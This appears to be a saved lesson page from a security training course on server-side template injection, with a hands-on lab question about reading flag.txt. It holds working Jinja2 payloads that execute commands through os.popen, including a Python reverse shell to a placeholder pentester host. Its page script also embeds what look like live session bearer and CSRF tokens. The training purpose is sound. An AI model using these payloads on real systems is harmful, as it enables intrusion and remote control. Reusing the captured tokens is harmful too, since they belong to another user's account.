+<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">python</span></div><pre class=" language-python"><code class=" language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span>request<span class="token punctuation">.</span>application<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
+</code></pre></div></div>
+<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">python</span></div><pre class=" language-python"><code class=" language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
+</code></pre></div></div>
+<p>A reverse shell can also be established through a payload such as the below.</p>
+<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">python</span></div><pre class=" language-python"><code class=" language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">214</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_module<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">'__import__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'python -c \'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;PENTESTER_IP&gt;",&lt;PENTESTER_PORT&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
+</code></pre></div></div>
+<p>Now, proceed to this section's exercise and complete the objective either by crafting the payload yourself or through a shell obtained with the help of <code>tplmap</code>.</p>
+<div id="screen" style="height: 600px; border: 1px solid;">
+<div class="screenPlaceholder">
+<div class="instanceLoading" style="display: none;">
+<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i></h1>
+<div class="text-center">Instance is starting...</div>
+</div>
+<div class="instanceTerminating" style="display: none;">
+<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i></h1>
+<div class="text-center">Terminating instance...</div>
+</div>
+<div class="row instanceStart max-width-canvas">
+<div class="col-4"></div>
+<div class="col-4">
+<button class=" startInstanceBtn btn btn-primary btn-lg btn-block" style="margin-top: 270px;">Start Instance</button>
+<p class="text-center mt-2 font-size-13 font-secondary">
+<span class="text-success spawnsLeft">
+<i class="fal fa-infinity"></i>
+</span> / 1 spawns left
+</p>
+</div>
+<div class="col-4"></div>
+</div>
+</div>
+</div>
+<div class="row align-center justify-center my-4">
+<div class="col-5 justify-start">
+<button style="display:none;" target="_blank" class="instance-button fullScreenBtn btn btn-light btn-sm float-left "><i class="fad fa-expand text-success mr-1"></i> &nbsp;Full Screen</button>
+<button style="display:none;" class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2"><i class="fad fa-times text-danger"></i> &nbsp;Terminate</button>
+<button style="display:none;" class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1"><i class="fad fa-sync text-warning mr-2"></i> &nbsp;Reset</button>
+<div class="btn-group " role="group">
+<button style="display:none;cursor: default;" class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1">Life Left: <span class="lifeLeft"></span>m</button>
+<button style="display:none;" data-toggle="tooltip" data-title="Extend Life" class=" extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm " data-original-title="" title=""><i class="fa fa-plus text-success"></i></button>
+</div>
+</div>
+<div id="statusText" class="col-7 justify-end pt-2 pr-2 font-size-small text-right">Waiting to start...</div>
+ </div>
+<div class="card" id="questionsDiv">
+<div class="card-body">
+<div class="row">
+<div class="col-9">
+<h4 class="card-title mt-0 font-size-medium">Questions</h4>
+<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below to complete this Section and earn cubes!</p>
+<p class="card-title-desc font-size-large font-size-15">
+Target: <span class="text-success"><span class="target" style="cursor:pointer;"><span class="spawnTargetBtn">Click here to spawn the target system!</span></span></span>
+<button class="resetTargetBtn btn btn-light btn-sm " data-toggle="tooltip" data-title="Reset Target" style="cursor: pointer; display: none;" data-original-title="" title=""><i class="fad fa-sync text-warning"></i></button>
+<br>
+<span class="targetLifeTimeContainer" style="display: none;">Time Left: <span class="targetLifeTime  font-size-15">0</span> minutes</span>
+</p>
+</div>
+<div class="col-3 text-right float-right">
+</div>
+</div>
+<div>
+<div>
+<label class="module-question" for="897"><span class="badge badge-soft-dark font-size-14 mr-2">+ 2 <i class="fad fa-cube text-success"></i></span> Use what you learned in this section to read the contents of flag.txt, which resides in the current working directory. Answer format: HTB{String}</label>
+<div class="row">
+<div class=" col-lg-8  mb-4">
+<input class="form-control bg-color-blue-nav" id="answer897" type="text" color="green" placeholder="Submit your answer here..." maxlength="191">
+</div>
+<div class="col-lg-2 mb-4">
+<button class="btn btn-primary btn-block btnAnswer" id="btnAnswer897" data-question-id="897"><i class="fad fa-flag-checkered mr-2"></i> Submit</button>
+</div>
+<div class="col-lg-2 mb-4">
+</div>
+</div>
+<div class=""></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="card bg-color-blue-nav" style="margin: 30px 0">
+<div class="card-body">
+<a href="https://academy.hackthebox.com/module/145/section/1344" class="btn btn-light module-button py-2" style="float: left"><i class="fa fa-arrow-alt-left mr-1"></i> Previous</a>
+<form action="https://academy.hackthebox.com/module" method="POST" class="form-inline" id="completeForm" style="float: right">
+<input type="hidden" name="module_id" value="145">
+<input type="hidden" name="page_id" value="18">
+<input type="hidden" name="completed" value="1">
+<button id="completeBtn" class="btn btn-outline-success" style="display:none;"><i class="fa fa-check-circle"></i> Mark Complete &amp; Next</button>
+</form>
+<a href="https://academy.hackthebox.com/module/145/section/1308" class="btn btn-light ml-2 module-button py-2" style="float: left">Next <i class="ml-1 fa fa-arrow-alt-right"></i></a>
+</div>
+</div>
+</div>
+<div class="col-md-12 col-xl-3 col-xxl-3">
+<div id="table-of-contents">
+<div class="card">
+<div class="card-body bg-color-blue-nav">
+<a href="https://academy.hackthebox.com/module/145/section/1343#questionsDiv" class="btn btn-light btn-block module-button"><i class="fad fa-question mr-2"></i> Go to Questions</a>
+</div>
+</div>
+<div class="card" id="TOC">
+<div class="card-body bg-color-blue-nav">
+<h5 class="card-title font-size-15 mb-4">Table of Contents</h5>
+<a href="https://academy.hackthebox.com/module/145/section/1293" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">Introduction to Server-Side Attacks</span>
+</a>
+<h6 class="mt-4 mb-2">Abusing Intermediary Applications</h6> <a href="https://academy.hackthebox.com/module/145/section/1294" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">AJP Proxy</span>
+</a>
+<a href="https://academy.hackthebox.com/module/145/section/1295" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">Nginx Reverse Proxy &amp; AJP</span>
+</a>
+<a href="https://academy.hackthebox.com/module/145/section/1296" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">Apache Reverse Proxy &amp; AJP</span>
+</a>
+<h6 class="mt-4 mb-2">Server-Side Request Forgery (SSRF)</h6> <a href="https://academy.hackthebox.com/module/145/section/1297" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">Server-Side Request Forgery (SSRF) Overview</span>
+</a>
+<a href="https://academy.hackthebox.com/module/145/section/1298" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">SSRF Exploitation Example</span>
+</a>
+<a href="https://academy.hackthebox.com/module/145/section/1299" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">Blind SSRF</span>
+</a>
+<a href="https://academy.hackthebox.com/module/145/section/1300" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">Blind SSRF Exploitation Example</span>
+</a>
+<a href="https://academy.hackthebox.com/module/145/section/1301" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">Time-Based SSRF</span>
+</a>
+<h6 class="mt-4 mb-2">Server-Side Includes (SSI) Injection</h6> <a href="https://academy.hackthebox.com/module/145/section/1302" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">Server-Side Includes Overview</span>
+</a>
+<a href="https://academy.hackthebox.com/module/145/section/1303" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">SSI Injection Exploitation Example</span>
+</a>
+<h6 class="mt-4 mb-2">Edge-Side Includes (ESI) Injection</h6> <a href="https://academy.hackthebox.com/module/145/section/1304" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">Edge-Side Includes (ESI)</span>
+</a>
+<h6 class="mt-4 mb-2">Server-Side Template Injections</h6> <a href="https://academy.hackthebox.com/module/145/section/1305" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+ <span class="font-size-13">Introduction to Template Engines</span>
+</a>
+<a href="https://academy.hackthebox.com/module/145/section/1306" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">SSTI Identification</span>
+</a>
+<a href="https://academy.hackthebox.com/module/145/section/1307" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">SSTI Exploitation Example 1</span>
+</a>
+<a href="https://academy.hackthebox.com/module/145/section/1344" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">SSTI Exploitation Example 2</span>
+</a>
+<a href="https://academy.hackthebox.com/module/145/section/1343" class="btn   text-primary  btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">SSTI Exploitation Example 3</span>
+</a>
+<h6 class="mt-4 mb-2">Extensible Stylesheet Language Transformations Server-Side Injections</h6> <a href="https://academy.hackthebox.com/module/145/section/1308" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">Attacking XSLT</span>
+</a>
+<h6 class="mt-4 mb-2">Skills Assessment</h6> <a href="https://academy.hackthebox.com/module/145/section/1346" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">Server-Side Attacks - Skills Assessment</span>
+</a>
+</div>
+</div>
+<div class="card">
+<div class="card-body bg-color-blue-nav">
+<h5 class="card-title mb-4">My Workstation</h5>
+<div class="row">
+<div class="col-12">
+<div id="sidePreview" style="height: 160px; border: 1px solid #323232; border-radius: 5px; background-color: #0a121c; text-align: center">
+<div class="screenPlaceholder">
+<p class="instanceStart" style="padding-top:70px; letter-spacing: 5px;">OFFLINE</p>
+<p class="instanceLoading " style="padding-top:70px; display: none"><i class="fa fa-circle-notch fa-spin"></i> Starting...</p>
+</div>
+</div>
+</div>
+<div class="col-12 mt-2">
+<div class="instanceStart">
+<button class=" startInstanceBtn btn btn-light btn-sm mt-2 btn-block module-button py-2"><i class="fad fa-play-circle text-success"></i> &nbsp;Start Instance</button>
+<p class="text-center mt-2 font-size-13 font-secondary">
+<span class="text-success spawnsLeft">
+<i class="fal fa-infinity"></i>
+</span> / 1 spawns left
+</p>
+</div>
+<button style="display:none;" class="fullScreenBtn btn btn-light btn-sm mt-2 module-button py-2"><i class="fad fa-expand text-success"></i> &nbsp;Interact</button>
+<button style="display:none;" class="terminateInstanceBtn btn btn-light btn-sm mt-2 module-button py-2"><i class="fad fa-times text-danger"></i> &nbsp;Terminate</button>
+<button style="display:none;" class="resetInstanceBtn btn btn-light btn-sm mt-2 module-button py-2"><i class="fad fa-sync text-warning"></i> &nbsp;Reset</button>
+<div class="btn-group" role="group">
+<button style="display:none; cursor: default;" class=" extendInstanceBtn btn btn-light btn-sm mt-2 module-button py-2">Life Left: <span class="lifeLeft"></span>m</button>
+<button style="display:none;" data-toggle="tooltip" data-title="Extend Life" class=" extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm mt-2 module-button py-2" data-original-title="" title=""><i class="fa fa-plus text-success"></i></button>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="hint897" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="hint897" aria-hidden="true">
+<div class="modal-dialog modal-dialog-centered">
+<div class="modal-content">
+<div class="modal-body">
+<div class="text-center">
+<h5><i class="fad fa-life-ring text-success"></i>&nbsp; Hint</h5>
+<br>
+<h6></h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="cheatSheetModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="unlockModuleModal" aria-hidden="true">
+<div class="modal-dialog modal-lg">
+<div class="modal-content">
+<div class="modal-body">
+<div class="text-center text-break">
+<h5><i class="fad fa-file-alt"></i>&nbsp; Cheat Sheet</h5>
+<p>The cheat sheet is as a useful command reference for this module.</p>
+</div>
+</div>
+<div class="modal-footer">
+<a class="btn btn-light btn-block" href="https://academy.hackthebox.com/module/cheatsheet/145">Download Cheatsheet</a>
+</div>
+</div>
+</div>
+</div>
+</div>
+<footer class="footer">
+<div class="container-fluid">
+<div class="row">
+<div class="col-sm-6">
+</div>
+<div class="col-sm-6">
+<div class="text-sm-right d-none d-sm-block">
+Powered by &nbsp; <a href="https://www.hackthebox.com/" target="_blank"><img style="margin-bottom: 1px;" src="./Server-side Attacks16_files/logo-htb.svg" height="20px"></a>
+</div>
+</div>
+</div>
+</div>
+</footer>
+</div>
+</div>
+</div>
+<script src="./Server-side Attacks16_files/jquery.min.js.download"></script>
+<script src="./Server-side Attacks16_files/bootstrap.bundle.min.js.download"></script>
+<script src="./Server-side Attacks16_files/metisMenu.min.js.download"></script>
+<script src="./Server-side Attacks16_files/simplebar.min.js.download"></script>
+<script src="./Server-side Attacks16_files/waves.min.js.download"></script>
+<script src="./Server-side Attacks16_files/toastr.min.js.download"></script>
+<script src="./Server-side Attacks16_files/axios.min.js.download"></script>
+<script src="./Server-side Attacks16_files/prism.js.download"></script>
+<script src="./Server-side Attacks16_files/main.js.download"></script>
+<script>
+    axios.defaults.headers.common = {
+        'X-CSRF-TOKEN': 'OEgK0JdzOZwGIHHODUXYrzCqZr0uFSlpTj7r9g5E',
+        'X-Requested-With': 'XMLHttpRequest',
+        'Authorization': 'Bearer ' + 'jgfghW9jOUxTYrPOMG9i2ujbtUFdtKuilcFrKtLWJpv9gAzKxNnjcsm7Dg2wIx8ivYvDBp7jCWD5XRNP'
+    };
+</script>
+<script>
+    $('table').addClass('table table-striped text-left').wrap('<div class="table-responsive"></div>');
+
+    $('.training-module a').attr('target','_blank').attr('rel','noopener nofollow');
+
+    $( ".favouriteBtn" ).click(function() {
+        let id = $(this).data('module-id');
+
+        axios.get('/api/modules/favourite/'+id).then(response => {
+            let data = response.data;
+            if (data.fav === 1) {
+                $(this).removeClass('far fa').addClass('fa');
+                toastr["success"](data.message, "Success");
+            } else {
+                $(this).removeClass('far fa').addClass('far');
+                toastr["success"](data.message, "Success");
+            }
+        });
+    });
+
+    function encode_utf8(string) {
+    return unescape(encodeURIComponent(string));
+  }
+
+  $('.btnAnswer').click(function() {
+    let question_id = $(this).data('question-id');
+    $(this).attr('disabled', 1);
+    let utf8EncodedString = encode_utf8($('#answer' + question_id).val());
+    axios.post('/api/check/answer', {
+      answer: btoa(utf8EncodedString),
+      question_id: question_id
+    }).then(response => {
+      $(this).removeAttr('disabled');
+      let data = response.data;
+      if (data.success === 0) {
+        toastr['error'](data.message, 'Error');
+      } else {
+        $(this).attr('disabled', 1);
+        $('#answer' + question_id).attr('disabled', 1);
+        $('#answer' + question_id).addClass('text-success');
+        $('#hintBtn' + question_id).attr('disabled', 1);
+        toastr['success'](data.message, 'Success');
+        completeCheck();
+      }
+    });
+  });
+
+  $('.btnAnswerExercise').click(function() {
+    let exercise_id = $(this).data('exercise-id');
+    $(this).attr('disabled', 1);
+    let utf8EncodedString = encode_utf8($(`#exerciseAnswer${exercise_id}`).val());
+    axios.post(`/api/check/exercise/${exercise_id}/answer`, {
+      answer: btoa(utf8EncodedString)
+    }).then(response => {
+      $(this).removeAttr('disabled');
+      let data = response.data;
+      if (data.success === 0) {
+        toastr['error'](data.message, 'Error');
+      } else {
+        $(this).attr('disabled', 1);
+        $(`#exerciseAnswer${exercise_id}`).attr('disabled', 1);
+        $(`#exerciseAnswer${exercise_id}`).addClass('text-success');
+        toastr['success'](data.message, 'Success');
+      }
+    });
+  });
+
+    
+    $('.reveal-modal').click(e => {
+        let id = $(e.target).data('exercise-id');
+        $(`#revealExerciseAnswer${id}`).modal('hide');
+    });
+
+    $( document ).ready(function() {
+
+        $('pre').filter(function () {
+            return this.className.match(/\blanguage-/);
+        }).each(function () {
+            let heading = $(this).prevAll().closest('h4').last().text();
+
+            if (this.className === ' language-shell-session') {
+                wrapTerminal(this, heading);
+            } else if (this.className === ' language-powershell-session') {
+                wrapPSTerminal(this, heading);
+            } else if (this.className === ' language-cmd-session') {
+                wrapCMDTerminal(this, heading);
+            } else if (this.className.startsWith(' language-')) {
+                var language = this.className.split('-').pop();
+                wrapCodeBlock(this,language);
+            }
+        });
+
+        wrapBrowser($('.website-screenshot'));
+        completeCheck();
+
+        $("span:contains('[!bash!]')").html('<span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span>');
+    });
+
+    function completeCheck()
+    {
+        axios.get('/api/check/complete/1343').then(response => {
+            let data = response.data;
+            if (data.success === 1) {
+                if (data.completed === true) {
+                    $('#completeBtn').show();
+                }
+            }
+        });
+    }
+
+    function wrapTerminal(element, heading)
+    {
+        $(element).css('line-height', '0px');
+        $(element).wrap('<div class="window_content"></div>')
+            .parent().wrap('<div class="window_container"></div>')
+            .prepend(`
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">${heading}</span>
+                </div>
+            `);
+    }
+    function wrapPSTerminal(element, heading)
+    {
+        $(element).css('background', '#012456').children().css('color','white');
+        $(element).css('line-height', '0px');
+        $(element).wrap('<div class="window_content"></div>')
+            .parent().wrap('<div class="window_container"></div>')
+            .prepend(`
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">${heading}</span>
+                </div>
+            `);
+    }
+    function wrapCMDTerminal(element, heading)
+    {
+        $(element).css('background', 'black').children().css('color','white');
+        $(element).css('line-height', '0px');
+        $(element).wrap('<div class="window_content"></div>')
+            .parent().wrap('<div class="window_container"></div>')
+            .prepend(`
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">${heading}</span>
+                </div>
+            `);
+    }
+    function wrapCodeBlock(element,lang)
+    {
+        $(element).wrap('<div class="window_content"></div>')
+            .parent().wrap('<div class="window_container"></div>')
+            .prepend('<div class="window_top">Code: <span class="text-success">'+lang+'</div>');
+    }
+    function wrapBrowserOld(element)
+    {
+        $(element).css("border", "0px").css("border-radius","0");
+        let url = element.data('url');
+        $(element).wrap('<div class="window_content"></div>')
+            .parent().wrap('<div class="window_container"></div>')
+            .prepend(`
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <input type="text" class="website-screenshot-url" disabled value="${url}">
+                    <span class="float-right"><i class="fa fa-home"></i></span>
+                </div>
+            `);
+    }
+    function wrapBrowser(element)
+    {
+        $(element).css("border", "0px").css("border-radius","0");
+
+        $(element).each( function(index,e) {
+            let url = $(e).data('url');
+            $(e).wrap('<div class="window_content"></div>')
+                .parent().wrap('<div class="window_container"></div>')
+                .prepend(`
+                    <div class="window_top">
+                        <span class="mr-2">
+                            <i class="fa fa-arrow-circle-left"></i> <i class="fa fa-arrow-right"></i> <i class="fa fa-redo"></i> <i class="fa fa-home"></i>
+                        </span>
+                        <input type="text" class="website-screenshot-url" disabled value="${url}">
+                        <span class="float-right"><i class="fa fa-bars"></i></span>
+                    </div>
+                `);
+        })
+    }
+</script>
+<script type="module">
+    import RFB from '/assets/libs/vnc/core/rfb.js';
+
+    let rfb;
+    let sidePreview;
+    let desktopName;
+    let pwnboxActive = false;
+
+    function connectedToServer(e) {
+        status("Connected to " + desktopName);
+        $('.fullScreenBtn').show();
+        $('.resetInstanceBtn').show();
+        $('.terminateInstanceBtn').show();
+        $('.extendInstanceBtn').show();
+        $('.instanceLoading').hide();
+        $('.instanceStart').hide();
+        $('.resetInstanceBtn').prop('disabled',false);
+        $('.fullScreenBtn').prop('disabled',false);
+        $('.extendInstanceBtn').prop('disabled',false);
+        $('.terminateInstanceBtn').prop('disabled',false);
+
+        document.querySelector('canvas').addEventListener('focus', (event) => {
+            navigator.clipboard.readText()
+                .then(text => {
+                    writeToClipboard(text);
+                })
+                .catch(err => {
+                    console.log('Something went wrong while accessing clipboard', err);
+                })
+        });
+
+    }
+
+    function disconnectedFromServer(e) {
+        status("Disconnected");
+        $('.screenPlaceholder').show();
+        stopCountdown();
+    }
+
+    function clipboardReceived(e) {
+        navigator.clipboard.writeText(e.detail.text)
+            .then(() => {
+                // Success!
+            })
+            .catch(err => {
+                console.log('Something went wrong while copying to clipboard.', err);
+            });
+    }
+
+    function updateDesktopName(e) {
+        desktopName = e.detail.name;
+    }
+
+    function status(text) {
+        console.log(text);
+        $("#statusText").html(text);
+    }
+
+    function readQueryVariable(name) {
+        const re = new RegExp('.*[?&]' + name + '=([^&#]*)'),
+            match = document.location.href.match(re);
+
+        if (match) {
+            return decodeURIComponent(match[1]);
+        }
+
+        return null;
+    }
+
+    function writeToClipboard(text) {
+        rfb.clipboardPasteFrom(text);
+    }
+
+    let host = '';
+    let password = '';
+    let countdown = '';
+    let targetCountdown = '';
+    let url= '';
+    let spawnInterval = null;
+
+    function getPwnbox() {
+        axios.get('/api/get/pwnbox').then(response => {
+            let data = response.data;
+
+            if (spawnInterval !== null && data.instance.action_log !== null) {
+                let error = data.instance.action_log.find(log => log.error === true);
+                if (error) {
+                    $('.resetInstanceBtn').prop('disabled',false);
+                    $('.fullScreenBtn').prop('disabled',false);
+                    $('.extendInstanceBtn').prop('disabled',false);
+                    $('.terminateInstanceBtn').prop('disabled',false);
+                    $('.instanceStart').show();
+                    $('.instanceLoading').hide();
+                    $('.startInstanceBtn').show();
+
+                    clearInterval(spawnInterval);
+                    disconnectedFromServer();
+
+                    let errorMessage = `${error.text}. Please contact support.`;
+                    toastr["error"](errorMessage, "Error");
+
+                    status(errorMessage);
+                    return;
+                }
+            }
+
+            if (data.success === 1 && data.instance.vnc_password !== null) {
+                if (data.instance.action_log.find(log => log.action === 'ready')) {
+                    host = 'proxy-uk.htb-cloud.com/bird/' + data.instance.hostname;
+                    password = data.instance.vnc_password;
+                    $('.lifeLeft').html(data.instance.life_remaining);
+                    startCountdown();
+                    $('.screenPlaceholder').hide();
+                    url = 'https://vnc.htb-cloud.com/index.html?host=' + host + '&password=' + password;
+                    pwnboxActive = true;
+                    connect();
+
+                    if (spawnInterval !== null) {
+                        clearInterval(spawnInterval);
+                    }
+                }
+            } else {
+                $('.screenPlaceholder').show();
+            }
+
+        });
+    }
+
+        function extendPwnbox() {
+        axios.get('/api/extend/pwnbox').then(response => {
+            let data = response.data;
+            if (data.success === 1) {
+                $('.lifeLeft').html(data.instance.life_remaining);
+                stopCountdown();
+                startCountdown();
+                toastr["success"]("Time extended for 60 minutes.", "Success");
+            } else {
+                toastr["error"](data.message, "Error");
+            }
+
+        });
+    }
+    
+    getPwnbox();
+
+    function startCountdown() {
+        countdown = setInterval(function() {
+            let life = parseInt($('.lifeLeft').html()) -1;
+            $('.lifeLeft').html(life)
+        }, 60 * 1000);
+    }
+
+    function stopCountdown() {
+        clearInterval(countdown);
+    }
+
+    function terminatePwnbox() {
+        $('.resetInstanceBtn').prop('disabled',true);
+        $('.terminateInstanceBtn').prop('disabled',true);
+        $('.fullScreenBtn').prop('disabled',true);
+        $('.extendInstanceBtn').prop('disabled',true);
+        $('.instanceStart').hide();
+
+        $('.instanceTerminating').show();
+
+        status('Terminating Interactive Instance...');
+
+        axios.delete('/api/terminate/pwnbox')
+            .then(({ data }) => {
+                if (data.success === 1) {
+                    $('.startInstanceBtn').show();
+                    $('.instanceStart').show();
+                    $('.instanceTerminating').hide();
+                    $('.resetInstanceBtn').hide();
+                    $('.terminateInstanceBtn').hide();
+                    $('.fullScreenBtn').hide();
+                    $('.extendInstanceBtn').hide();
+
+                    pwnboxActive = false;
+
+                    toastr['success']('Instance has been terminated.', 'Success');
+                } else {
+                    toastr['error'](data.message, 'Error');
+                    connect();
+                    $('.resetInstanceBtn').prop("disabled", false);
+                    $('.fullScreenBtn').prop('disabled',false);
+                    $('.extendInstanceBtn').prop('disabled',false);
+                    $('.terminateInstanceBtn').prop('disabled',false);
+                }
+            });
+    }
+
+    function startPwnbox() {
+        $('.resetInstanceBtn').prop('disabled',true);
+        $('.fullScreenBtn').prop('disabled',true);
+        $('.extendInstanceBtn').prop('disabled',true);
+        $('.terminateInstanceBtn').prop('disabled',true);
+        $('.instanceStart').hide();
+        $('.instanceLoading').show();
+        $('.startInstanceBtn').hide();
+
+        status("Starting Interactive Instance...");
+
+        grecaptcha.ready(function() {
+            grecaptcha.execute('6LeI6LsaAAAAAKgdStgBC6B4UVbXlpYNaYGN46Ah', {action: 'spawnPwnbox'}).then(function(token) {
+                if (token) {
+                    axios.get('/api/spawn/pwnbox?g-recaptcha-response= '+token).then(response => {
+                        let data = response.data;
+                        if (data.success === 1) {
+                            spawnInterval = setInterval(() => {
+                                getPwnbox();
+                            }, 2000);
+                        } else {
+                            if(data.code === 1 || (data.code === 3 && pwnboxActive)) {
+                                $('.resetInstanceBtn').prop("disabled", false);
+                                $('.fullScreenBtn').prop('disabled',false);
+                                $('.extendInstanceBtn').prop('disabled',false);
+                                $('.terminateInstanceBtn').prop('disabled',false);
+                                connect();
+
+                                if (data.code === 3) {
+                                    $('.instanceLoading').hide();
+                                    startCountdown();
+                                }
+                            } else {
+                                $('.startInstanceBtn').show();
+                                $('.instanceStart').show();
+                                $('.instanceLoading').hide();
+                            }
+
+                            toastr["error"](data.message, "Error");
+                        }
+
+                    });
+                } else {
+                    $('.resetInstanceBtn').prop('disabled',false);
+                    $('.fullScreenBtn').prop('disabled',false);
+                    $('.extendInstanceBtn').prop('disabled',false);
+                    $('.terminateInstanceBtn').prop('disabled',false);
+                    $('.instanceStart').show();
+                    $('.instanceLoading').hide();
+                    $('.startInstanceBtn').show();
+                }
+            });
+        });
+    }
+
+    $('.fullScreenBtn').click(function() {
+        window.open(url, "_blank");
+    });
+
+    $('.startInstanceBtn').click(function() {
+        startPwnbox();
+                spawnTarget();
+            });
+
+    $('.resetInstanceBtn').click(function() {
+        $('.screenPlaceholder').show();
+        $('.instanceStart').show();
+                rfb.disconnect();
+                sidePreview.disconnect();
+        startPwnbox();
+    });
+
+    $('.terminateInstanceBtn').click(function() {
+        $('.screenPlaceholder').show();
+        $('.instanceStart').show();
+                rfb.disconnect();
+                sidePreview.disconnect();
+        terminatePwnbox();
+    });
+
+    $('.extendInstanceBtnClicker').click(function() {
+       extendPwnbox();
+    });
+
+    $('.resetTargetBtn').click(function(){
+        $(this).prop('disabled',true);
+                    spawnDocker();
+                    });
+
+    function connect() {
+        status("Connecting to " + host.split('/')[2] + "...");
+
+                rfb = new RFB(document.getElementById('screen'), 'wss://' + host,
+            { credentials: { password: password } });
+        //Listeners
+        rfb.addEventListener("desktopname", updateDesktopName);
+        rfb.addEventListener("clipboard",clipboardReceived);
+
+        rfb.resizeSession = true;
+        rfb.viewOnly = false;
+        
+        sidePreview = new RFB(document.getElementById('sidePreview'), 'wss://' + host,
+            { credentials: { password: password } });
+
+        sidePreview.addEventListener("connect",  connectedToServer);
+        sidePreview.addEventListener("disconnect", disconnectedFromServer);
+
+        sidePreview.resizeSession = false;
+        sidePreview.viewOnly = true;
+        sidePreview.scaleViewport = true;
+    }
+
